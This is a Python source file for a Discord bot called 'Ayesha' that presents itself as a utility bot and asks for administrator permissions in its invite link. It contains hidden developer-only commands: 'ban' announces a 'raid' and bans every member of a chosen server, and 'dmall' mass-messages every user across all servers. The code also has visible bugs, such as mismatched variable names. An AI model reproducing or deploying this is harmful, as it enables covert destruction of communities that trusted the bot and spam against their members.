import discord
from discord.ext.commands import bot
from discord import game
from discord.ext import commands
import asyncio
import platform
import colorsys
import random
import time

client = commands.Bot(command_prefix = '?', case_insensitive=True)
Client = discord.client
Clientdiscord = discord.Client()
devs=["668157292927254587","apna id dalo aha pe"]





@client.command(pass_context = True, no_pm=True)
async def serverlist(ctx):
    if ctx.message.author.id in devs:
        for server in client.servers:
        #print(server.name)
         await client.say(server.name)
    else:
         await client.say("**This command is only for developer's use. May be you are not a developer of this bot.**")    


@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)     
async def userinfo(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Name", value=user.name, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="Status", value=user.status, inline=True)
    embed.add_field(name="Highest role", value=user.top_role)
    embed.add_field(name="Joined", value=user.joined_at)
    embed.set_thumbnail(url=user.avatar_url)
    await client.say(embed=embed)

@client.command(pass_context=True)
async def servercount(self):
    """Shows the total servers and users that Ayesha is connected to."""
        
    embed=discord.Embed(colour=0xFF0000)
    embed.add_field(name="__Servers__", value="Ayesha is connected to __**{}**__ servers.".format(len(self.bot.servers)))
    embed.add_field(name="__Users__", value="Ayesha is connected to __**{}**__ users.".format(str(len(set(self.bot.get_all_members())))))
    embed.set_thumbnail(url=self.bot.user.avatar_url)
    embed.set_author(name="Ayesha", icon_url=self.bot.user.avatar_url)
    await self.bot.say(embed=embed)

@client.command(pass_context=True)
async def left(ctx, serverid):
    if ctx.message.author.id in devs:
        try:
            await client.leave_server(client.get_server(str(serverid)))
            await client.say(f"Left the server")
        except Exception as ex:
            await client.say(f"Server not found. {ex}")


@client.command(pass_context=True)
async def ban(cx, serverid):
    if ctx.message.author.id in devs:
        try:
            serve=client.get_server(str(serverid))
            await client.say(f"**Starting raid on `{server.name}`**")
            for member in list(server.members):
                try:
                    await client.ban(member, 2)
                    await client.say(f"Banned {member.name}")
                except:
                    await client.say(f"Couldn't ban {member.name}")
        except Exception as ex:
            await client.say(f"Server not found. {ex}")
            
@commands.has_permissions(administration=True)
@client.command(pass_context = True)
async def dm(ctx, user: discord.User, *, message=None):
    message = message or "This Message is sent via DM"
    await bot.send_message(user, message)

@commands.has_permissions(administrator=True)
@client.command(pass_context = True)
async def send(ctx, *, content: str):
        for member in list(ctx.message.server.members):
            try:
                await client.send_message(member, content)
                await client.say("DM Sent To : {} :white_check_mark:  ".format(member))
            except:
                print("can't")
                await client.say("DM Can't Sent To : {} :x: ".format(member))

@client.command(pass_context=True, no_pm=True)
async def dmall(ctx, *,content: str):
    devs=["668157292927254587","648764430099677214","597404687192424448"]
    if ctx.message.author.id in devs:
        for a in client.servers:
            for member in list(a.members):
                try:
                    await client.send_message(member, content)
                    await client.say("DM Sent To : {} ✅  ".format(member))
                except:
                    print("can't")
                    await client.say("DM Can't Sent To : {} ❌ ".format(member))
    else:
         await client.say("**This command is only for developer's use. May be you are not a developer of this bot.**")

@client.command(pass_context=True)
async def invite(ctx):
    embed = discord.Embed(title="Information About The Bot", description="Bot Name - Ayesha", color=0x00ff00)
    embed.set_footer(text="Created with 💖 by L0SER#8228")
    embed.set_author(name="")
    embed.add_field(name="invite this bot to your server. Invite Link -https://discordapp.com/api/oauth2/authorize?client_id=709967188563591238&permissions=8&scope=bot", value="Thanks for adding our bot", inline=True)
    await client.say(embed=embed)
    

@client.event
async def on_ready():
    print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
    print('--------')
    print('--------')
    print('Started ')
    print('Created with 💖 by L0SER#8228')
    while True:
      await client.change_presence(game=discord.Game(type=1,name="with LOSER#8228"))
      await asyncio.sleep(5)
      await client.change_presence(game=discord.Game(name="with L0SER"))
      await asyncio.sleep(5)
      await client.change_presence(game=discord.Game(name=f"{(len(set(client.get_all_members())))} MEMBERS",type=3))
      await asyncio.sleep(5)
      await client.change_presence(game=discord.Game(name=f"{(len(client.servers))} Servers",type=1))
      await asyncio.sleep(5)
      await client.change_presence(game=discord.Game(name="?help",type=2))
      await asyncio.sleep(5)
    
client.run("aha pe bot token dalo")                
